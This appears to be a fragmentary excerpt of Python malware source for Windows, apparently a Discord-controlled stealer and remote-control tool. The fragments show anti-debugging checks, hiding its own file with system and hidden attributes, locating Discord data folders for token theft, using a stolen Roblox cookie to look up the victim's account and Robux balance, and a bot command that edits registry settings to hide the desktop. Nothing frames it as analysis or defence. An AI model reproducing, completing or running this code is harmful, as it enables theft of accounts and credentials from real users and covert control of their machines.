...
def cd():
    try:
        ...
        pass
    try:
        if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(),
...
def prs():
    try:
        ...
        subprocess.run(['attrib', '+h', '+s', p], capture_output=True,
...
def gdt():
    ...
    paths = {'Discord': os.path.join(roaming, 'Discord'),
...
def fri(cookie):
    ...
    try:
        ...
        u = r.json()
        uid = u["id"]
        robux = requests.get(f"https://economy.roblox.com/v1/users/{uid}/currency", headers=headers,
                             timeout=10).json().get("robux", 0)
...
async def hidedesktop(ctx):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0,
